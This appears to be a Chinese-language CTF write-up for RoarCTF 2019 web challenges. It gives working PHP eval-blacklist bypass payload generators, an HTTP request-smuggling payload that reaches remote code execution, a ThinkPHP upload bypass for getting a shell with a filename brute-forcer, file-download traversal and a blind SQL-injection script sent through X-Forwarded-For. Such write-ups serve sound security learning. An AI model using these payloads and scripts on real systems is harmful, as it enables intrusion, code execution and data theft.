categories:
- 比赛
tags:
- wp
- ctf
title: roarctf2019
---
# roarctf2019



## web

### easycalc



#### 源码

```php

<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```





#### 解法一 肝就完事

强行绕过限制

关键:`((10000000000000).(0)){3}`=>E

python脚本

```python
arr={
    "0":'''((0).(0)){0}''',
    "1":'''((1).(0)){0}''',
    "2":'''((2).(0)){0}''',
    "3":'''((3).(0)){0}''',
    "4":'''((4).(0)){0}''',
    "5":'''((5).(0)){0}''',
    "6":'''((6).(0)){0}''',
    "7":'''((7).(0)){0}''',
    "8":'''((8).(0)){0}''',
    "9":'''((9).(0)){0}''',
    "-": "((-1).(0)){0}",
    "." :"((1.1).(0)){1}",
    "E": "((10000000000000000000).(1)){3}",
    "p":"((((10000000000000000000).(1)){3})&(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))",
    "$":"((((-1).(0)){0})&(((4).(0)){0}))",
    "l":"((((-1).(0)){0})&(((4).(0)){0}))|(~((0).(0)){0})&~((~((8).(0)){0})&(~((((10000000000000000000).(1)){3})&(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))",
    "H": "(~((0).(0)){0})&~((~((8).(0)){0})&(~((((10000000000000000000).(1)){3})&(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))",
    "Z" : "(~(((((-1).(0)){0})&(((4).(0)){0}))))&(~((~(((8).(0)){0}))&((~(((2).(0)){0}))&(~(((((10000000000000000000).(1)){3})&(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))))",
    "v" :"(((2).(0)){0})|((~((1).(0)){0})&((10000000000000000000).(1)){3})",
    "D" :"(~((1).(0)){0})&((10000000000000000000).(1)){3}",
    "A" :"(~((2).(0)){0})&(~((~((1).(0)){0})&(~((((10000000000000000000).(1)){3})&(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))",
    "P" :"(~((1.1).(0)){1})&((((10000000000000000000).(1)){3})&(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))",
    "O" :"(~((0).(0)){0})&(~((~((8).(0)){0})&((~((2).(0)){0})&(~((10000000000000000000).(1)){3}))))",
    "S" :"(~((((-1).(0)){0})&(((4).(0)){0})))&(~((~((2).(0)){0})&(~((10000000000000000000).(1)){3})))",
    "U" :"(((10000000000000000000).(1)){3})|((~((((-1).(0)){0})&(((4).(0)){0})))&(~((~((1).(0)){0})&(~((1.1).(0)){2}))))",
    "_" :"((10000000000000000000).(1)){3}|(((~((((-1).(0)){0})&(((4).(0)){0})))&(~((~((1).(0)){0})&(~((1.1).(0)){1})))))",
    "T" :"(~(((1).(0)){0}&(~((2).(0)){0})))&(~((~((10000000000000000000).(1)){3})&(~(((1).(0)){0}&(~((1.1).(0)){1})))))",
    "I" :"(~(((0).(0)){0}))&(~((~((8).(0)){0})&((~((1).(0)){0})&(~((((10000000000000000000).(1)){3})&(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))))",
    "N" :"(~((0).(0)){0})&(~((~((8).(0)){0})&((~(((2).(0)){0}))&(~((~((1).(0)){0})&((10000000000000000000).(1)){3})))))",
    "f" :"((((-1).(0)){0})&(((4).(0)){0}))|((~(((4).(0)){0}))&(~((~(((2).(0)){0}))&(~((((10000000000000000000).(1)){3})&(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))))",
    "B" :"(~(((4).(0)){0}))&(~((~(((2).(0)){0}))&(~((((10000000000000000000).(1)){3})&(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))",
    "r" :"(~((~(((2).(0)){0}))&(~((((10000000000000000000).(1)){3})&(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))",
    "[" :"(~(((((-1).(0)){0})&(((4).(0)){0}))))&(~((~((8).(0)){0})&((~(((2).(0)){0}))&(~(((10000000000000000000).(1)){3})))))",
    "]" :"(((10000000000000000000).(1)){3})|((((8).(0)){0})&(~(((((-1).(0)){0})&(((4).(0)){0})))))",
    "C":"(~(((4).(0)){0}))&(~((~(((2).(0)){0}))&(~(((10000000000000000000).(1)){3}))))",
    "M":"(~(((0).(0)){0}))&(~((~(((8).(0)){0}))&(~(((10000000000000000000).(1)){3}))))",
    "\\":"(~(((((1).(0)){0}))&(~(((2).(0)){0})))&~((~(((10000000000000000000).(1)){3}))&~((((8).(0)){0})&(~(((((-1).(0)){0})&(((4).(0)){0})))))))",
    "/":"((((1.1).(0)){1})|(((-1).(0)){0}))",
    "G":"(~(((8).(0)){0}))&(~((~(((2).(0)){0}))&(~(((10000000000000000000).(1)){3}))))",
    "g":"(((10000000000000000000).(1)){3})|((((2).(0)){0})&(((1.1).(0)){1}))",
    "a":"((((1).(0)){0})&((~((2).(0)){0})))|((((((10000000000000000000).(1)){3})&(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))&(~((((1).(0)){0})&(~(((1.1).(0)){1})))))"
    }
s="scandir"
def topayload(s):
    result=""
    for i in s:
        if(i in arr):
            result+=("("+arr[i]+")"+".")
            continue
        if(i.upper() in arr):
            result+=("("+arr[i.upper()]+")"+".")
            continue
        if(i.lower() in arr):
            result+=("("+arr[i.lower()]+")"+".")
    return result[:-1]
def tomethod(meth,para,c=True):
    if c:
        return "("+topayload(meth)+")("+topayload(para)+")"
    else :
        return "("+topayload(meth)+")("+(para)+")"
# print(tomethod("var_dump",tomethod("scandir","/"),False))
print(tomethod("var_dump",tomethod("file","/f1agg"),False))
# print(tomethod("file_get_contents","/f1agg"))

```





#### 解法二 HTTP走私

http走私请看:https://paper.seebug.org/1048/



这题php禁用了` $blacklist = [' ', '\t', '\r', '\n','\'', '"', '反引号', '\[', '\]','\$','\\','\^'];`

apache再禁用了字母和不可打印字符

后来看别人的wp知道了,虽然服务器返回400,但是还会将请求转发给后端,标准的http走私

![image.png](https://i.loli.net/2019/10/18/9YgzckxODPiNe6C.png)

真几把神奇，刚看到http走私的时候我还以为是前后端对content-type的解析不同

结合getallheads来绕过php字符限制



最后payload:

```
POST /calc.php?num=eval(end(getallheaders())); HTTP/1.1
Host: node3.buuoj.cn:28023
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
Referer: http://node3.buuoj.cn:28023/
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 422
Content-Length: 0
A: var_dump(file_get_contents("/f1agg"));


```





#### 解法三 利用php字符串解析特性绕过apache waf



php字符串解析特性

![](https://image.3001.net/images/20190904/1567560438_5d6f12f680afe.png!small)

![](https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png!small)



当我们发送这样一个请求是:`?%20num=123`

apache的检查规则只能匹配到num,而这个请求在php却会被解析为$_GET['num']最后成功绕过apache的waf



### Easy Java

扫目录发现一个Download,去登入界面查找一下download,发现`Download?filename=help.docx`

可是无论下什么也不行,看了别人的wp发现post就可以233333

接下来就简单了,因为这是一个tomcat的网站

贴一个tomcat的结构图

![](https://i.loli.net/2019/09/01/LduWtSfIh8bDA7Z.png)



先去查看一下WEB-INF/web.xml

发现

```xml
    <servlet>
        <servlet-name>FlagController</servlet-name>
        <servlet-class>com.wm.ctf.FlagController</servlet-class>
    </servlet>
```

于是去WEB-INF/classes/com/wm/ctf/FlagController.class

查看,发现一个base64编码的字符串

![image.png](http://ww1.sinaimg.cn/large/006pWR9agy1g82oi6jxybj31240l2dj8.jpg)



### simple_upload

#### 源码

```php
<?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        $_FILES['file']['name']
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
}
```

#### 解法一 thinkphp漏洞

利用`Think\Controller,\Think\Upload()` 等关键字查询到该thinkphp版本大致在3.2.x,这里我去找了3.2.3的源码

阅读文件上传部分代码发现

```php
<?php
    ....
    public function upload($files = '')
    {
        if ('' === $files) {
            $files = $_FILES;
        }
    	.....
           
        $files = $this->dealFiles($files);
        foreach ($files as $key => $file) {
            $file['name'] = strip_tags($file['name']);
            if (!isset($file['key'])) {
                $file['key'] = $key;
            }
        ....
	}
    ....
    ?>
```

这里注意到有个strip_tags,查询文档`         从字符串中去除 HTML 和 PHP 标记`

ok,成功找到绕过后缀名限制的方法

![image.png](http://ww1.sinaimg.cn/large/006pWR9agy1g82rhln3m6j31240l2whe.jpg)

成功getflag美滋滋



#### 解法二  上传多个文件绕过后缀名检测

大佬们太强了/fad/fad

```php
 $uploadFile = $_FILES['file'] ;
if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
```

如果上传多个文件, $uploadFile内包含多个文件,`strstr(strtolower($uploadFile['name']), ".php")`自然也就无效了,接下来就是获取文件名,就可以getshell,因为thinkphp文件名是递增的,所以也就很容易获取到想要的文件了

```pyhon
import requests
url="http://aba32602-5c6b-4a9f-bfa6-bbf2ca660f7e.node3.buuoj.cn/Public/Uploads/2019-10-18/"
i=(int("5da9dd208595a",16)+1)
while True:
	print(url+hex(i)[2:]+".php")
	res=requests.get(url+hex(i)[2:]+".php")
	print(res.status_code)
	if(res.status_code==200):
		print(url+hex(i)[2:]+".php")
		break

	i+=1
```



虽然说可以爆出来，不过也要跑好一会



### Online Proxy

利用libcurl和paras_url的差异来判断

http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com

200

http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219

504

而访问http://node3.buuoj.cn:28001/?url=http://39.108.164.219

也是504,所以有可能使用file_get_contents来访问url

刚开始一直盯着url,后面看到收集信息,99%是sql注入的题

就是不知道要收集什么信息

```html
<!-- Debug Info: 
 Duration: 0.20821499824524 s 
 Current Ip: 127.0.0.1  -->
<!-- Debug Info: 
 Duration: 0.34751987457275 s 
 Current Ip: '# 
Last Ip: ' -->
```



这题虽然是sql注入,但比较操蛋的是,sql注入的是last ip

因为这个加上自己的懒惰让我搞了8-9个小时,因小失大/fad

题目提示会收集信息,能收集的大概也就是ip地址

于是找到x-forward-for http注入,虽然说的轻松,但是我完全找了好久还加上了wp的帮助

emmmm直接扔脚本

```python
import requests
import string
import random
import time
import sys
def rand_str(length=8):
    return ''.join(random.sample(string.ascii_letters + string.digits, length))

ii=0
def curl_url(sql):
    global ii
    headers={
        "Host":"node3.buuoj.cn:28645",
        "Cache-Control":"max-age=0",
        "X-Forwarded-For":"",
        "Upgrade-Insecure-Requests":"1",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection":"close"
    }
    cookies={"track_uuid":"1e3b12a4-60f8-4778-a0b7-%s;" % rand_str()}
    #1'+if(ascii(substr(hex((select GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database())),1,1))>0,sleep(10),0)+'13
    # headers["X-Forwarded-For"]="1'+if("+sql+",sleep(10),0)+'"+str(ii)
    url="http://node3.buuoj.cn:28841?url=http://127.0.0.1"
    #清空
    while True:
        headers["X-Forwarded-For"]="clear"+str(ii)
        try:
            res= requests.get(url,headers=headers,cookies=cookies,timeout=3)
        except :
            pass
        if "Last Ip: clear" in res.text:
            break
        ii+=1
    #压入
    headers["X-Forwarded-For"]="1'+if("+sql+",sleep(10),0)+'"+str(ii)
    res= requests.get(url,headers=headers,cookies=cookies,timeout=3)
    #执行
    while True:
        ii+=1
        headers["X-Forwarded-For"]="clear"+str(ii)

        try:
            res= requests.get(url,headers=headers,cookies=cookies,timeout=3)
        except :
            return 1
        
        if sql not in res.text:
            curl_url(sql)
        return 0


#database information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf
#table  F4l9_t4b1e
#column F4l9_C01uMn
#flag flag{G1zj1n_W4nt5_4_91r_Fr1end},flag{03a6ead5-ffec-4bc0-bffd-92efd5a81e11}
sql="(substr(hex((select GROUP_CONCAT(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e )),INDEX,1))='GUESS'"
result="696e666f726d6174696f6e5f736368656d612c746573742c6d7973716c2c637466747261696e696e672c706572666F726D616E63655F736368656D612c46346c395"
result="666c61677b47317a6a316e5f57346e74355f345f393172115"
index=len(result)

while True:
    index+=1
    for i in range(16):
        ii+=1
        tmp=sql.replace("INDEX",str(index)).replace("GUESS",hex(i)[2:])
        
        if curl_url(tmp):
            result+=hex(i)[2:]
            print(result)
            break
        print("第"+str(index)+"不是"+hex(i)[2:])
```

